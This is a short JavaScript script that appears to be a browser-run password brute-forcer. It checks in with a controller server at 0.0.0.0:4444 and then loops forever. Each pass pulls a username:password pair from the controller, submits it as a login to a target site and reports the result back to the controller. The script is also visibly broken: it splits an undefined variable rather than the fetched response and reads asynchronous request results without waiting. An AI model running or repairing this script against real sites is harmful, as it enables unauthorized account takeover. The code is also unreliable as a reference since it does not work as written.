/*----------------------------------*/
const URI = "http://0.0.0.0:4444/"
const TARG = "http://example.com/"
const WRONGFLAG = "No a user or password"
const xmlHttp = new XMLHttpRequest();
/*----------------------------------*/
function bF() {
    xmlHttp.open("GET",URI+"cred");
    xmlHttp.send();
    resp = xmlHttp.responseText

    inpt = str.split(":")

    xmlHttp.open("POST",TARG);
    xmlHttp.send("user="+inpt[0]+"&"+"password="+inpt[1]);

    if (xmlHttp.responseText.includes(WRONGFLAG)) {
        xmlHttp.open("GET",URI+"conf?state=no&credent="+resp);
        xmlHttp.send();
    } else {
        xmlHttp.open("GET",URI+"conf?state=ye&credent="+resp);
        xmlHttp.send();
    }
}
/*----------------------------------*/
function httpget() {
    xmlHttp.open("GET",URI);
    xmlHttp.send();
    return xmlHttp.responseText;
}
/*----------------------------------*/
const x = httpget()
if (x == "It Works!") {
    while (1) {
        bF()
    }
}